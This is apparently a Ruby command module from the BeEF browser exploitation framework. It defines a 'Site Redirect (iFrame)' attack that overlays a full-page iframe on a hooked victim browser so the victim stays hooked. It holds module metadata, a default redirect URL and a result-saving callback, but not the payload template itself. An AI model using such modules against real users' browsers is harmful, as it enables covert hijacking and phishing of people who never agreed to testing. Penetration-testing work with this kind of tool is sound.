module BeEF
module Modules
module Commands


class Site_redirect_iframe < BeEF::Command
  
  	#
  	# Defines and set up the command module.
  	#
	def initialize
		super({
      			'Name' => 'Site Redirect (iFrame)',
      			'Description' => 'This module will redirect the hooked browser to the address specified in the \'Redirect URL\' input. It creates a 100% x 100% overlaying iframe to keep the victim hooked.',
      			'Category' => 'Browser',
      			'Author' => 'ethicalhack3r',
			      'Data' => [
			        ['name' => 'iframe_src', 'ui_label' => 'Redirect URL', 'value' => 'http://www.bindshell.net/', 'width'=>'200px']
			      ],
	      		'File' => __FILE__,
			      'Target' => { 'browser_name' => BeEF::Constants::Browsers::ALL }
   		 })
   
    		use_template!
	end

  # This method is being called when a hooked browser sends some
  # data back to the framework.
  #
  def callback
    save({'result' => @datastore['result']})
  end
  
end

end
end
end
